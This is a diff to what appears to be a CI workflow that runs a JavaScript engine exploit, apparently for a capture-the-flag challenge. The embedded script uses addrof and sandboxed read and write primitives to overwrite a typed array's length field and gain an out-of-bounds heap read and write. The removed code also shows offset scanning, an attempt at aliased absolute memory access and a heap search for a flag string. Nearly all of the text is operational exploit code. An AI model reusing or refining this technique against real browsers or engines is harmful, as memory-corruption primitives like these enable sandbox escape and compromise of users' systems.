@@ -4096,12 +4096,17 @@ jobs:
 
           base = base_without_stage4("/tmp/poc_test_poly.js")
           probe = r"""
-          // ===== STAGE B: safer discovery + OOB/abs attempt (d=-8 lead) =====
+          // ===== STAGE B: NEXT STEP — single-offset d=-8 probe only =====
+          // Goal: prove length/view change at d=-8 without SEGV, then controlled OOB.
+          // No wide scans. No 0xffffffff. Restore after every write.
           (function stageB() {
             print("[*] STAGE_B_BEGIN");
+            print("[*] NEXT_STEP=single_offset_d_minus_8");
             if (typeof instance === "undefined" || !instance.exports) {
               print("[-] STAGE_B_NO_INSTANCE");
               print("[*] ABS_RW_OK=0");
+              print("[*] OOB_OK=0");
+              print("[*] FIELD_HIT_COUNT=0");
               print("[*] STAGE_B_END");
               return;
             }
@@ -4110,254 +4115,167 @@ jobs:
               try { return caged_read(off|0)|0; } catch (e) { return null; }
             }
             function safe_write(off, val) {
-              try { caged_write(off|0, val|0); return true; } catch (e) { return false; }
+              try { caged_write(off|0, val|0); return true; } catch (e) {
+                print("[!] caged_write threw off=" + off + " " + e);
+                return false;
+              }
             }
             function hex(x) { return "0x" + ((x>>>0).toString(16)); }
 
-            // Layout dump (compact)
-            let ab0 = new ArrayBuffer(0x100);
-            let u0 = new Uint32Array(ab0);
-            for (let i = 0; i < 8; i++) u0[i] = 0xA0000000 + i;
-            let objs = [["arraybuffer", ab0], ["uint32array", u0],
-                        ["function", function(){return 1;}], ["object", {a:1}]];
-            let dumps = 0;
-            for (let i = 0; i < objs.length; i++) {
-              let name = objs[i][0], o = objs[i][1], a = 0;
-              try { a = addrof(o)|0; } catch (e) { continue; }
-              print("[+] addrof(" + name + ")=" + hex(a));
-              let line = name + " @" + hex(a) + " :";
-              for (let d = -0x20; d <= 0x80; d += 4) {
-                let v = safe_read((a + d)|0);
-                if (v === null) continue;
-                line += " [" + d + "]=" + hex(v);
-              }
-              print(line);
-              dumps++;
-            }
-
-            // Cage smoke
+            // --- Cage smoke (known-good) ---
             let smoke_ok = 0;
             try {
-              let off = addrof(ab0)|0;
+              let ab_s = new ArrayBuffer(0x40);
+              let off = addrof(ab_s)|0;
               safe_write(off, 0x41424344);
-              if ((safe_read(off)|0) === (0x41424344|0)) { smoke_ok = 1; print("[+] STAGE_B_CAGE_WRITE_OK"); }
+              if ((safe_read(off)|0) === (0x41424344|0)) {
+                smoke_ok = 1;
+                print("[+] STAGE_B_CAGE_WRITE_OK");
+              }
             } catch (e) { print("[!] smoke " + e); }
+            print("[*] STAGE_B_CAGE_SMOKE=" + smoke_ok);
 
-            // ===== Safer discovery focused on prior lead d=-8 =====
-            print("[*] STAGE_B2_SAFE_DISCOVERY");
-            let ab = new ArrayBuffer(0x4000); // larger buffer for OOB headroom
-            let u32 = new Uint32Array(ab);
-            for (let i = 0; i < 64; i++) u32[i] = 0x10000000 + i;
-            let ta = addrof(u32)|0;
-            print("[+] discovery TA addrof=" + hex(ta) + " len=" + u32.length);
-
-            let hits = [];
-            // Priority offsets first (known lead + neighbors), then wider scan
-            let deltas = [-16,-12,-8,-4,0,4,8,12,16,20,24,28,32,36,40,44,48,52,56,60,64,68,72,76,80,84,88,92,96,100,104,108,112,116,120,124];
-            // mild markers only — avoid 0xffffffff (crashed last run)
-            let markers = [0x10, 0x20, 0x40, 0x100, 0x400, 0x1000, 0x0];
-
-            function try_slot(d) {
-              let slot = (ta + d)|0;
-              let old = safe_read(slot);
-              if (old === null) return;
-              let before0 = u32[0]|0;
-              let beforeLen = u32.length|0;
-              for (let mi = 0; mi < markers.length; mi++) {
-                let m = markers[mi];
-                if ((m|0) === (old|0)) continue;
-                if (!safe_write(slot, m)) continue;
-                let after0 = u32[0]|0;
-                let afterLen = u32.length|0;
-                let changed = (after0 !== before0) || (afterLen !== beforeLen);
-                // restore immediately
-                safe_write(slot, old);
-                try { u32[0] = before0; } catch (e) {}
-                if (changed) {
-                  print("[+] FIELD_HIT d=" + d + " old=" + hex(old) + " wrote=" + hex(m) +
-                        " u32[0] " + hex(before0) + "->" + hex(after0) +
-                        " len " + beforeLen + "->" + afterLen);
-                  hits.push({d:d, old:old|0, wrote:m|0, lenBefore:beforeLen, lenAfter:afterLen});
-                  return true;
-                }
-              }
-              safe_write(slot, old);
-              return false;
+            // --- Compact layout of one TA for RE ---
+            let ab_layout = new ArrayBuffer(0x100);
+            let u_layout = new Uint32Array(ab_layout);
+            for (let i = 0; i < 8; i++) u_layout[i] = 0xA0000000 + i;
+            let ta_layout = addrof(u_layout)|0;
+            print("[+] layout TA addrof=" + hex(ta_layout));
+            let line = "u32 @" + hex(ta_layout) + " :";
+            for (let d = -0x10; d <= 0x50; d += 4) {
+              let v = safe_read((ta_layout + d)|0);
+              if (v === null) continue;
+              line += " [" + d + "]=" + hex(v);
             }
+            print(line);
+            print("[+] STAGE_B_LAYOUT_DUMP_OK objects=1");
 
-            // 1) known lead
-            try_slot(-8);
-            // 2) rest
-            for (let i = 0; i < deltas.length; i++) {
-              if (deltas[i] === -8 && hits.length) continue;
-              try {
-                try_slot(deltas[i]);
-              } catch (e) {
-                print("[!] try_slot d=" + deltas[i] + " threw " + e);
-              }
-            }
-            print("[*] FIELD_HIT_COUNT=" + hits.length);
-
+            // ===== ONLY d=-8 =====
+            print("[*] STAGE_B2_D_MINUS_8_PROBE");
+            let FIELD_HIT_COUNT = 0;
+            let LENGTH_HIT = 0;
+            let OOB_OK = 0;
             let ABS_RW_OK = 0;
             let ABS_RW_METHOD = "none";
-            let OOB_OK = 0;
-            let FLAG_VIA_OOB = 0;
 
-            // ===== Length OOB primitive using hit slots =====
-            print("[*] STAGE_B2_LENGTH_OOB");
-            for (let hi = 0; hi < hits.length; hi++) {
-              let h = hits[hi];
-              let slot = (ta + h.d)|0;
-              let old = safe_read(slot);
-              // set a moderately large length (elements), not maxint
-              let newLen = 0x1000; // 4096 elements
-              if (!safe_write(slot, newLen)) continue;
-              let reported = 0;
-              try { reported = u32.length|0; } catch (e) { print("[!] length get " + e); }
-              print("[*] after len poke d=" + h.d + " u32.length=" + reported);
-              try {
-                // in-bounds for original 0x4000-byte buffer: 0x1000 u32s = 0x4000 bytes — edge
-                let mid = u32[16]|0;
-                print("[*] u32[16]=" + hex(mid));
-                // true OOB relative to original 0x4000 buffer would be index >= 0x1000
-                // original ab is 0x4000 bytes = 0x1000 u32 elements — so length 0x1000 is exact edge
-                // use bigger backing for real OOB
-              } catch (e) { print("[!] oob touch " + e); }
-              safe_write(slot, old);
+            // Fresh objects for probe (do not reuse layout objects)
+            let ab = new ArrayBuffer(0x1000); // 4096 bytes = 1024 u32 elements
+            let u32 = new Uint32Array(ab);
+            for (let i = 0; i < 32; i++) u32[i] = 0x10000000 + i;
+            let ta = addrof(u32)|0;
+            let slot = (ta - 8)|0;  // d=-8
+            let old = safe_read(slot);
+            print("[+] probe TA addrof=" + hex(ta));
+            print("[+] d=-8 slot=" + hex(slot) + " old=" + (old === null ? "null" : hex(old)));
+            print("[+] u32.length before=" + (u32.length|0) + " u32[0]=" + hex(u32[0]|0));
+
+            if (old === null) {
+              print("[-] cannot read d=-8 slot");
+              print("[*] FIELD_HIT_COUNT=0");
+              print("[*] OOB_OK=0");
+              print("[*] ABS_RW_OK=0");
+              print("[*] ABS_RW_METHOD=none");
+              print("[*] STAGE_B_END");
+              return;
             }
 
-            // Fresh large buffer for controlled OOB
-            try {
-              let big = new ArrayBuffer(0x1000); // 4096 bytes = 1024 u32s
-              let bu = new Uint32Array(big);
-              for (let i = 0; i < 32; i++) bu[i] = 0x20000000 + i;
-              let bta = addrof(bu)|0;
-              print("[+] big TA addrof=" + hex(bta) + " len=" + bu.length);
+            // Mild length candidates only (avoid 0xffffffff / huge values)
+            // Prior hit had old≈0x2000000; element length for 0x1000-byte AB is 0x400
+            let candidates = [0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x401, 0x800, 0x1000];
+            let hit_wrote = null;
+            let hit_len_before = u32.length|0;
+            let hit_len_after = hit_len_before;
+            let hit_u0_before = u32[0]|0;
+            let hit_u0_after = hit_u0_before;
 
-              // Prefer d=-8 if it was a hit, else all hits
-              let tryDs = hits.length ? hits.map(h => h.d) : [-8];
-              for (let ti = 0; ti < tryDs.length && OOB_OK === 0; ti++) {
-                let d = tryDs[ti];
-                let slot = (bta + d)|0;
-                let old = safe_read(slot);
-                print("[*] OOB attempt d=" + d + " old=" + hex(old));
-                // inflate length carefully
-                if (!safe_write(slot, 0x4000)) { continue; }
+            for (let i = 0; i < candidates.length; i++) {
+              let m = candidates[i];
+              if ((m|0) === (old|0)) continue;
+              let bLen = u32.length|0;
+              let b0 = u32[0]|0;
+              if (!safe_write(slot, m)) {
+                print("[!] write failed m=" + hex(m));
+                safe_write(slot, old);
+                continue;
+              }
+              let aLen = bLen, a0 = b0;
+              try { aLen = u32.length|0; } catch (e) { print("[!] length get threw " + e); }
+              try { a0 = u32[0]|0; } catch (e) { print("[!] u32[0] get threw " + e); }
+              // ALWAYS restore before interpreting
+              safe_write(slot, old);
+              try { u32[0] = b0; } catch (e) {}
+
+              print("[*] try m=" + hex(m) + " len " + bLen + "->" + aLen + " u32[0] " + hex(b0) + "->" + hex(a0));
+              if (aLen !== bLen || a0 !== b0) {
+                FIELD_HIT_COUNT = 1;
+                hit_wrote = m;
+                hit_len_before = bLen;
+                hit_len_after = aLen;
+                hit_u0_before = b0;
+                hit_u0_after = a0;
+                print("[+] FIELD_HIT d=-8 old=" + hex(old) + " wrote=" + hex(m) +
+                      " len " + bLen + "->" + aLen + " u32[0] " + hex(b0) + "->" + hex(a0));
+                if (aLen !== bLen) {
+                  LENGTH_HIT = 1;
+                  print("[+] LENGTH_HIT d=-8");
+                }
+                break; // stop after first stable hit
+              }
+            }
+
+            // Ensure restored
+            safe_write(slot, old);
+            print("[*] FIELD_HIT_COUNT=" + FIELD_HIT_COUNT);
+            print("[*] LENGTH_HIT=" + LENGTH_HIT);
+
+            // --- Controlled OOB only if length field confirmed ---
+            if (LENGTH_HIT === 1 && hit_wrote !== null) {
+              print("[*] STAGE_B2_CONTROLLED_OOB");
+              // New buffer so prior restore is clean
+              let big = new ArrayBuffer(0x1000); // 1024 u32s max in-bounds
+              let bu = new Uint32Array(big);
+              for (let i = 0; i < 16; i++) bu[i] = 0x30000000 + i;
+              let bta = addrof(bu)|0;
+              let bslot = (bta - 8)|0;
+              let bold = safe_read(bslot);
+              print("[+] oob TA addrof=" + hex(bta) + " d=-8 old=" + hex(bold) + " len=" + (bu.length|0));
+
+              // Inflate length moderately above 1024 elements
+              let inflate = 0x1000; // 4096 elements claimed
+              if (safe_write(bslot, inflate)) {
                 let L = 0;
-                try { L = bu.length|0; } catch (e) {}
+                try { L = bu.length|0; } catch (e) { print("[!] len " + e); }
                 print("[*] inflated length=" + L);
                 if (L > 1024) {
                   try {
-                    let oob_idx = 1024; // first OOB u32 if backing still 0x1000 bytes
-                    let v = bu[oob_idx]|0;
-                    print("[+] OOB_READ idx=" + oob_idx + " val=" + hex(v));
-                    bu[oob_idx] = 0x43434343;
-                    let v2 = bu[oob_idx]|0;
-                    if ((v2|0) === (0x43434343|0)) {
-                      print("[+] OOB_WRITE_OK idx=" + oob_idx);
+                    let idx = 1024; // first OOB word if backing is still 0x1000 bytes
+                    let before = 0;
+                    try { before = bu[idx]|0; } catch (e) { print("[!] oob read throw " + e); }
+                    print("[*] OOB read bu[" + idx + "]=" + hex(before));
+                    bu[idx] = 0x43434343;
+                    let after = bu[idx]|0;
+                    print("[*] OOB write-read bu[" + idx + "]=" + hex(after));
+                    if ((after|0) === (0x43434343|0)) {
                       OOB_OK = 1;
-                      ABS_RW_METHOD = "oob_len_d" + d;
+                      ABS_RW_METHOD = "oob_len_d-8";
+                      print("[+] OOB_WRITE_OK idx=" + idx);
                     }
                   } catch (e) {
-                    print("[!] oob access threw " + e);
+                    print("[!] oob access " + e);
                   }
+                } else {
+                  print("[-] length did not inflate past backing (L=" + L + ")");
                 }
-                safe_write(slot, old);
               }
-            } catch (e) {
-              print("[!] big OOB setup failed " + e);
+              safe_write(bslot, bold);
+            } else {
+              print("[*] STAGE_B2_SKIP_OOB reason=no_length_hit");
             }
             print("[*] OOB_OK=" + OOB_OK);
 
-            // ===== Alias abs-R/W attempt using hit slots =====
-            print("[*] STAGE_B2_ALIAS_ATTEMPT");
-            try {
-              let a1 = new ArrayBuffer(0x200);
-              let u1 = new Uint32Array(a1);
-              let a2 = new ArrayBuffer(0x200);
-              let u2 = new Uint32Array(a2);
-              for (let i = 0; i < 8; i++) { u1[i] = 0x11110000 + i; u2[i] = 0x22220000 + i; }
-              let t1 = addrof(u1)|0;
-              let t2 = addrof(a2)|0;
-              let t2u = addrof(u2)|0;
-              print("[+] alias t1=" + hex(t1) + " ab2=" + hex(t2) + " u2=" + hex(t2u));
-
-              let tryDs = hits.length ? hits.map(h => h.d) : [-8, 16, 20, 24, 28, 32, 68, 72, 76, 80];
-              for (let ti = 0; ti < tryDs.length && ABS_RW_OK === 0; ti++) {
-                let d = tryDs[ti];
-                let slot = (t1 + d)|0;
-                let old = safe_read(slot);
-                if (old === null) continue;
-                // candidates: related addresses / heap words from victim
-                let cands = [
-                  t2|0, t2u|0, (t2 + 0x10)|0, (t2u + 0x10)|0,
-                  safe_read(t2), safe_read((t2+0x10)|0), safe_read((t2+0x14)|0),
-                  safe_read((t2+0x18)|0), safe_read((t2+0x1c)|0),
-                  safe_read(t2u), safe_read((t2u+0x10)|0), safe_read((t2u+0x14)|0)
-                ];
-                for (let ci = 0; ci < cands.length && ABS_RW_OK === 0; ci++) {
-                  let cand = cands[ci];
-                  if (cand === null) continue;
-                  if (!safe_write(slot, cand|0)) continue;
-                  // flip victim
-                  u2[0] = 0xC0FFEE01;
-                  let s = u1[0]|0;
-                  u2[0] = 0x22220000;
-                  if ((s|0) === (0xC0FFEE01|0)) {
-                    u1[0] = 0x41414141;
-                    if ((u2[0]|0) === (0x41414141|0)) {
-                      print("[+] ABS_RW_PROOF d=" + d + " cand=" + hex(cand));
-                      ABS_RW_OK = 1;
-                      ABS_RW_METHOD = "alias_d" + d;
-                      u2[0] = 0x22220000;
-                    }
-                  }
-                  safe_write(slot, old);
-                }
-                safe_write(slot, old);
-              }
-            } catch (e) {
-              print("[!] alias attempt " + e);
-            }
-
-            // ===== Best-effort flag byte scan via OOB if available =====
-            // Cannot open /flag from JS; only heap OOB. Still try to note if seed string appears in OOB window.
-            if (OOB_OK === 1 || ABS_RW_OK === 1) {
-              print("[*] STAGE_B2_HEAP_SCAN_FOR_SEED");
-              try {
-                let big = new ArrayBuffer(0x1000);
-                let bu = new Uint32Array(big);
-                let bta = addrof(bu)|0;
-                let d = (hits.length ? hits[0].d : -8);
-                let slot = (bta + d)|0;
-                let old = safe_read(slot);
-                safe_write(slot, 0x8000);
-                let needle = 0; // search for 'flag' ascii in oob
-                try {
-                  let u8 = new Uint8Array(big);
-                  // also view as expanded if length inflated
-                  for (let i = 0; i < Math.min(bu.length|0, 0x8000); i++) {
-                    // no-op scan of values — print rare markers only
-                    let v = bu[i]|0;
-                    // 'flag' little-endian 0x67616c66
-                    if ((v|0) === 0x67616c66) {
-                      print("[+] HEAP_HIT_FLAG_ASCII idx=" + i);
-                      FLAG_VIA_OOB = 1;
-                      break;
-                    }
-                  }
-                } catch (e) { print("[!] heap scan " + e); }
-                safe_write(slot, old);
-              } catch (e) { print("[!] flag scan setup " + e); }
-            }
-
-            if (dumps >= 2) print("[+] STAGE_B_LAYOUT_DUMP_OK objects=" + dumps);
+            // Alias abs-R/W not attempted here (next step after stable OOB)
             print("[*] ABS_RW_OK=" + ABS_RW_OK);
             print("[*] ABS_RW_METHOD=" + ABS_RW_METHOD);
-            print("[*] OOB_OK=" + OOB_OK);
-            print("[*] FLAG_VIA_OOB=" + FLAG_VIA_OOB);
-            print("[*] STAGE_B_CAGE_SMOKE=" + smoke_ok);
-            print("[*] FIELD_HIT_COUNT=" + hits.length);
             print("[*] STAGE_B_END");
           })();
           """
@@ -4420,6 +4338,9 @@ jobs:
           echo "ABS_RW_METHOD=$ARWM" | tee -a /tmp/out/test10.result
           OOB=$(grep -oE 'OOB_OK=[0-9]+' /tmp/out/test10.combined 2>/dev/null | tail -1 | cut -d= -f2)
           OOB=${OOB:-0}
+          LH=$(grep -oE 'LENGTH_HIT=[0-9]+' /tmp/out/test10.combined 2>/dev/null | tail -1 | cut -d= -f2)
+          LH=${LH:-0}
+          echo "LENGTH_HIT=$LH" | tee -a /tmp/out/test10.result
           echo "OOB_OK=$OOB" | tee -a /tmp/out/test10.result
           log "Stage B LAYOUT=$LAYOUT ABS_RW=$ABS CAGE_SMOKE=$SMOKE FIELD_HITS=$FHITS METHOD=$ARWM rc=$RC in=$IN_CT"
 
